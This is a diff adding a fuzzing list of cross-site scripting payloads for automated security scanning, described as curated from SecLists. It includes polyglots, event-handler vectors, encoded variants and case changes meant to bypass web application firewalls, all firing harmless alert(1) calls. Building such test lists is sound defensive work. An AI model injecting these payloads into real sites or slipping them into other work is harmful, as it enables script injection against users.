@@ -1,0 +1,52 @@
+# XSS Polyglots - Security testing payloads
+# These are intentional XSS test vectors for DAST scanning
+# Curated from SecLists/Fuzzing/XSS/
+
+# Comprehensive polyglots - these work in multiple HTML contexts
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+'";alert(1)//';alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>
+'">><marquee><img src=x onerror=confirm(1)></marquee></plaintext>
+"><svg onload=alert(1)//
+"><img src=x onerror=alert(1)//
+"onclick=alert(1)//
+"autofocus onfocus=alert(1)//
+'-alert(1)-'
+'/onclick=alert(1)//
+
+# Basic XSS vectors
+javascript:alert(1)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+
+# Shorter payloads (for length-limited inputs)
+<svg/onload=alert(1)>
+<img/src=x onerror=alert(1)>
+<body/onload=alert(1)>
+<input/onfocus=alert(1) autofocus>
+<marquee/onstart=alert(1)>
+<details/open/ontoggle=alert(1)>
+
+# Math and SVG vectors
+<math><a xlink:href="javascript:alert(1)">click
+<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100></rect></a></svg>
+
+# URL encoded variations
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+# Double encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Case variations for WAF bypass
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
